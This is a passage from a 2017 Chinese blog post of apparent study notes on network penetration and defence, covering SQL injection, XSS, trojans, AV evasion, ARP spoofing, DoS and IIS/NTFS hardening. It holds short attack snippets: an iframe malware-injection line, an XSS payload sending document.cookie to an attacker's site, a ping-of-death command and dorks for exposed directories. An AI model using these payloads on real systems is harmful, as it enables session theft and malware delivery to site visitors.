<li>“呼死你”k8——1000呼|短信</li>
</ol>
</li>
<li><p>网银攻击：</p>
<ul>
<li>浮云木马，在线劫持，网银大盗，银行卡复制，u盾：高级克隆（硬对硬复制） </li>
</ul>
</li>
<li><p>逻辑漏洞：</p>
<ul>
<li>表示逻辑  </li>
<li>业务逻辑  </li>
<li>访问逻辑</li>
<li>例：id=xxxxxxx&amp;pass=xxxxxxxxxx</li>
</ul>
</li>
<li><p>平行权限：</p>
<ul>
<li>网购：</li>
<li>A：订单1101，</li>
<li>B：订单=1101——删除</li>
</ul>
</li>
<li><p>目录遍历：</p>
<ul>
<li>原因：浏览目录权限  </li>
<li>baidu：  inurl；qq.txt<br>  index of /ppt    +pass/…………..<br>  index of /xls<br>  index of /data</li>
</ul>
</li>
<li><p>密码获取： </p>
<ol>
<li>暴力破解：LC，SAMINSIDE</li>
<li>肩窥</li>
<li>中间人攻击</li>
<li>siniffer 嗅探</li>
<li>社会工程学</li>
<li>星号密码克星     灵格斯翻译（划词功能）</li>
<li>自动登录，记住密码 cookies欺骗 绕过验证</li>
<li>数据库dv_log记录     </li>
</ol>
</li>
<li><p>网络钓鱼：</p>
<ul>
<li><a href="http://www.taobao.com（url转码）（越长越要小心）" target="_blank" rel="noopener">www.taobao.com（url转码）（越长越要小心）</a></li>
</ul>
</li>
<li><p>社会工程学：</p>
<ul>
<li>APT（持久性攻击）  </li>
<li>改号软件  QQ（女孩）</li>
<li>反向社工</li>
</ul>
</li>
</ul>
<h1 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h1><pre><code>1. access+asp
2. mssql
3. php+mysql
 4. jsp+oracle（大型）

1. 注入原因：程序对用户输入的字符没有过滤。
2. 如何判断注入点：www.xxxx.com/a.asp（脚本）？id=1....    能执行语句
3. 自动工具：domain   pangolin（穿山甲）   sqlmap    管中窥豹（穿waf：wab app fw）
</code></pre><h1 id="xss跨站："><a href="#xss跨站：" class="headerlink" title="xss跨站："></a>xss跨站：</h1><ul>
<li>挂马，盗cookies，xss盲打，dos，xss蠕虫，后台添加管理员</li>
</ul>
<h1 id="dos-ddos："><a href="#dos-ddos：" class="headerlink" title="dos/ddos："></a>dos/ddos：</h1><ul>
<li><p>拒绝服务/分布式拒绝服务（世界难题）</p>
</li>
<li><p>挂马：</p>
<ol>
<li><p>内嵌式框架挂马</p>
<pre><code>&lt;iframe src=http://(ip)/&gt; /&lt;//iframe/&gt;
</code></pre></li>
<li>数据库挂马</li>
<li>定向挂马</li>
<li>漏洞挂马：ie  暴风影音 360</li>
</ol>
</li>
</ul>
<h1 id="杀毒软件："><a href="#杀毒软件：" class="headerlink" title="杀毒软件："></a>杀毒软件：</h1><ul>
<li>已知病毒：特征码</li>
<li>未知病毒：主动防御——行为</li>
<li>高启发——仿真</li>
</ul>
<h1 id="免杀："><a href="#免杀：" class="headerlink" title="免杀："></a>免杀：</h1><ul>
<li>数字签名</li>
<li>区段加密.加壳</li>
</ul>
<h1 id="四无："><a href="#四无：" class="headerlink" title="四无："></a>四无：</h1><ul>
<li>无启动项，</li>
<li>无端口，</li>
<li>无进程，</li>
<li>无磁盘文件（hook，硬件：bios cih）</li>
</ul>
<h1 id="WEB终极加固："><a href="#WEB终极加固：" class="headerlink" title="WEB终极加固："></a>WEB终极加固：</h1><ul>
<li>iis：<ol>
<li>修改默认日志的路径</li>
<li>网站—属性—高级– ：协议版本，cookie<pre><code>（日志分析：splunk，biglog）
</code></pre></li>
<li>删除所有不必要的映射：扩展名：asp，html防止黑客上传其他扩展名文件<pre><code>主目录—配置—映射
</code></pre></li>
<li>向客户端发送以下信息：出错：110监控网站<pre><code>主目录—配置—映射
</code></pre></li>
<li>iis权限：不给写入，目录浏览</li>
<li>限制后台登陆ip：登录后台地址：admin—右键—目录安全性—属性—允许：ip段</li>
<li>删除所有自定义错误</li>
</ol>
</li>
</ul>
<ul>
<li><p>数据库：</p>
<ol>
<li>禁止websever和数据库同台</li>
<li>修改默认库及表的位置和名字</li>
<li>认证：口令复杂，权限：行，列，数据库加密，日志审核</li>
<li>防下载：数据库重定向主页</li>
</ol>
</li>
<li><p>ntfs加固：终极防webshell：能写不能执行 能执行不能写</p>
<ol>
<li>删除所有默认权限</li>
<li>添加administrator，完全控制</li>
<li>添加iis—wpg：完全控制</li>
<li>添加iusr—计算机名 （来宾）–只读</li>
<li>确定那些需要写入权限：data，databackup，uploadfile，uploadface给来宾-写入</li>
<li>给以上目录：拒接执行</li>
</ol>
</li>
</ul>
<h1 id="dos-ddos-拒绝服务-分布式拒绝服务"><a href="#dos-ddos-拒绝服务-分布式拒绝服务" class="headerlink" title="dos/ddos  拒绝服务/分布式拒绝服务"></a>dos/ddos  拒绝服务/分布式拒绝服务</h1><ul>
<li><p>tcp三次握手   </p>
<ul>
<li>S-syn： 请求连接（1）</li>
<li>F-fin ：结束连接（1）</li>
<li>A-ack：确定 acknumber=对方seg+1</li>
<li><p>R-rst：复位</p>
<p>-发送方：syn=1, seg=100<br>-接收方：syn=1, ack=1, acknumber=101, seg=300<br>-发送方：       ack=1, acknumber=301, seg=100</p>
</li>
</ul>
</li>
<li><p>配置远程控制木马：</p>
<ul>
<li>灰鸽子，</li>
<li>pcshare，</li>
<li>魔术，</li>
<li>波尔</li>
</ul>
<ol>
<li>pcshare无限版：生成客户端：<br>  ip：域名：端口：808（没有被占用的端口）    </li>
<li>穿墙 dll注入ie进程</li>
<li>ping of death： ping ip -1 65500 –t</li>
<li>阿拉丁</li>
<li>cc攻击（snifferrpro）</li>
</ol>
</li>
<li><p>会话劫持</p>
<ul>
<li>ip-mac：arp</li>
<li>cmd：       <ul>
<li>arp-a:显示本地arp缓存</li>
<li>arp-d *：清除缓存</li>
<li>arp-s：绑定</li>
</ul>
</li>
</ul>
<ol>
<li>安装CAIN，安装WINCAP</li>
<li>运行CAIN ： <ul>
<li>start sniffer 点网卡图标—host  空白区右键  sacn mac—-arp 点加号：左边：服务器ip，右边客户端ip</li>
</ul>
</li>
</ol>
</li>
</ul>
<h1 id="Xss跨站（客户端）"><a href="#Xss跨站（客户端）" class="headerlink" title="Xss跨站（客户端）"></a>Xss跨站（客户端）</h1><ul>
<li><p>所有输入点都是攻击源</p>
<ol>
<li><p>测试漏洞：</p>
<pre><code>&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;
</code></pre></li>
<li>挂马：”&lt;iframe src=hettp//ip//a.js&gt;“</li>
<li>盗cookis <ul>
<li>例”<scrpt>document.location=’自己网站/cookies.asp?msg=’+document.cookie“</scrpt></li>
<li>(在自己做的网站下放cookies。Asp文件用来获取盗取的cookies)</li>
</ul>
</li>
</ol>
</li>
</ul>
<h1 id="木马的隐藏"><a href="#木马的隐藏" class="headerlink" title="木马的隐藏"></a>木马的隐藏</h1><ol>
<li>Rar文件：创建自解压格式<pre><code>解压前：muma.exe
解压后：qq.exe
</code></pre></li>
<li>伪装成图片和记事本的图标</li>
<li>利用捆绑器：正常文件+木马</li>
<li>源分发:源代码里有木马代码</li>
<li>hook：钩子 ssdt.lnkine.fsd.fsdinline</li>
<li>文件资源区</li>
<li>进程守护</li>
<li>dll注入进程</li>
<li>dll本地劫持</li>
</ol>
<h1 id="手工杀马："><a href="#手工杀马：" class="headerlink" title="手工杀马："></a>手工杀马：</h1><ul>
<li>Installrite：快照：snap1 snap2</li>
<li>Avafind：硬盘快速索引</li>
<li><p>进程管理工具</p>
</li>
<li><p>木马位置：</p>
<ul>
<li>查没有数字签名的进程文件cmd删除隐藏木马文件属性 ：</li>
<li>/a显示隐藏，attrib  –s -r- h删除属性</li>
</ul>
</li>
</ul>
<h1 id="手工杀病毒："><a href="#手工杀病毒：" class="headerlink" title="手工杀病毒："></a>手工杀病毒：</h1><ul>
<li>svchost。Exe位置</li>
<li>将svchost。Exe加载到od-右键-查看字符串</li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://dmonster.top/2017/04/06/网络渗透与深度防御笔记/" data-id="cjexzmnni0018e4ug33x98s4n" class="article-share-link" data-share="baidu" data-title="网络渗透与深度防御笔记">分享到</a>
      

      
        <a href="http://dmonster.top/2017/04/06/网络渗透与深度防御笔记/#ds-thread" class="article-comment-link">评论</a>
      

      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/实验/">实验</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/笔记/">笔记</a><span class="category-list-count">14</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCIE/">CCIE</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCNA/">CCNA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCNP/">CCNP</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/学习笔记/">学习笔记</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网络安全/">网络安全</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">十二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">6</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">近期文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/03/19/django强行入门——链接mysql数据库/">django强行入门——链接mysql数据库</a>
          </li>
        
          <li>
            <a href="/2018/03/18/pycharm-professional安装遇到的小麻烦/">pycharm professional安装遇到的小麻烦</a>
          </li>
        
          <li>
            <a href="/2017/12/02/网络安全/">网络安全</a>
          </li>
        
          <li>
            <a href="/2017/11/25/ISIS/">ISIS</a>
          </li>
        
          <li>
            <a href="/2017/11/25/多播/">多播</a>
          </li>
        
      </ul>
    </div>
  </div>

  
     
	<div class="widget-wrap"> 
		<h3 class="widget-title">Weibo show</h3> 
		<div class="widget-weibo"> 
			<iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=2&ptype=1&speed=0&skin=5&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=5753916666&verifier=c645597d&dpc=1"></iframe>
		</div> 
	</div> 

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 dmonster<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/sitemap.xml" class="mobile-nav-link">sitemap</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="返回顶部"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/script.js"></script>

</div>
</body>
</html>
